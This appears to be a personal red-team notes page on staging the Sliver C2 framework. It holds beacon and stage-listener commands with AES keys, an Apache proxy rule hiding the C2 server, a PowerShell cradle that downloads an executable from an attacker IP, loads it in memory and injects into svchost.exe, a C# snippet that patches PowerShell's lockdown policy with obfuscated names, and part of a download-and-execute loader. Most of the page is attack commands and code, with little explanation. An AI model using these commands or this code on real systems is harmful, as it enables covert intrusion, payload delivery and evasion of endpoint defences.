| 🏠 [Home](../../redteam.md) | ⬅️ ⬅️ [Part](../_part) | ⬅️ [Chapter](./_chapter) |
|-----------------------------|----------------------|-------------------------|

* [Notes](../../red_team/sliver/notes.md)
    * [private armory](../../red_team/sliver/notes.md#private-armory)
    * [Sliver prep](../../red_team/sliver/notes.md#sliver-prep)
    * [My SliverLoader](../../red_team/sliver/notes.md#my-sliverloader)
    * [Cyb3rDudu SliverLoader](../../red_team/sliver/notes.md#cyb3rdudu-sliverloader)

# Notes
## Private armory
a priori pas encore dispo en 1.5.44
il manque le flag --armory

`sliver/client/command/armory/install.go`
```go
func ArmoryInstallCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
...SNIP...
	armoryName, err := cmd.Flags().GetString("armory")
	if err != nil {
		con.PrintErrorf("Could not parse %q flag: %s\n", "armory", err)
		return
	}
```

`sliver/client/command/armory/parsers.go`

`sliver/Makefile`
```
ARMORY_REPO_URL ?= https://api.github.com/repos/sliverarmory/armory/releases
```

sliver/client/assets/armories.go

## Sliver prep

    profiles new beacon -http  http://10.10.16.179:80/sliver/initial --format shellcode --arch amd64 --seconds 15 --jitter 1 b_sliv_fh
    stage-listener --url http://127.0.0.1:8871 --profile b_sliv_fh  -C deflate9 --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV

    RewriteCond %{REQUEST_URI} ^/s_b_fh/(.*)$
    RewriteRule ^s_b_fh/(.*)$ http://127.0.0.1:8871/$1 [P]    

## My SliverLoader

    .\SliverLoader.exe -v -u http://10.10.16.179:80/s_b_fh/test.woff -c deflate9 
        -p QzpcV2luZG93c1xTeXN0ZW0zMlxjYWxjLmV4ZQ== 
        -c RChIK0tiUGVTaFZtWXEzdDZ2OXkkQiZFKUhATWNRZlQ=:OXkvQj9FKEcrS2JQZVNoVg==

## Cyb3rDudu SliverLoader

[SliverLoader](https://github.com/Cyb3rDudu/SliverLoader)

    $d = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.179/lab/SliverBypassLoader.exe');
    $asm = [System.Reflection.Assembly]::Load($d);

    $params="http://10.10.16.179:80/s_b_fh/test.woff deflate9 svchost.exe RChIK0tiUGVTaFZtWXEzdDZ2OXkkQiZFKUhATWNRZlQ= OXkvQj9FKEcrS2JQZVNoVg==".split(" ");
    $OldConsoleOut = [Console]::Out; 
    $StringWriter = New-Object IO.StringWriter ; 
    [Console]::SetOut($StringWriter) ; 
    $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));
    [Console]::SetOut($OldConsoleOut); 
    $Results = $StringWriter.ToString(); 
    $Results

change altbypass to public class

this code seems to create problems

        /*
        Bypass();

        Char a1, a2, a3, a4, a5;
        a1 = 'y';
        a2 = 'g';
        a3 = 'u';
        a4 = 'o';
        a5 = 't';
        var Automation = typeof(System.Management.Automation.Alignment).Assembly;
        // Get ptr to System.Management.AutomationSecurity.SystemPolicy.GetSystemLockdownPolicy
        var get_l_info = Automation.GetType("S" + a1 + "stem.Mana" + a2 + "ement.Au" + a5 + "oma" + a5 + "ion.Sec" + a3 + "rity.S" + a1 + "stemP" + a4 + "licy").GetMethod("GetS" + a1 + "stemL" + a4 + "ckdownP" + a4 + "licy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
        var get_l_handle = get_l_info.MethodHandle;
        uint lpflOldProtect;
        RuntimeHelpers.PrepareMethod(get_l_handle);
        var get_l_ptr = get_l_handle.GetFunctionPointer();

        // make the System.Management.AutomationSecurity.SystemPolicy.GetSystemLockdownPolicy VM Page writable & overwrite the first 4 bytes
        VirtualProtect(get_l_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);
        var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
        Marshal.Copy(new_instr, 0, get_l_ptr, 4);
        */

    public static void Main(string[] args)
    {
        // Parse args
        string listenerUrl = "", compressAlgorithm = "", targetBinary = "";
        byte[] aesKey = {};
        byte[] aesIv = {};
        if (args != null && 
            args.Length > 0 && 
            !string.IsNullOrEmpty(args[0]) && 
            !string.IsNullOrEmpty(args[1]) && 
            !string.IsNullOrEmpty(args[2]) && 
            !string.IsNullOrEmpty(args[3]) && 
            !string.IsNullOrEmpty(args[4]))
        {
            listenerUrl = args[0];
            targetBinary = args[1];
            compressAlgorithm = args[2];
            aesKey = Convert.FromBase64String(args[3]);
            aesIv = Convert.FromBase64String(args[4]);
        }
        DownloadAndExecute(listenerUrl, targetBinary, compressAlgorithm, aesKey, aesIv);
    }
    public static void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm, byte[] aeskey, byte[] aesiv)
    {
        byte[] AESKey = aeskey;
        byte[] AESIV = aesiv;
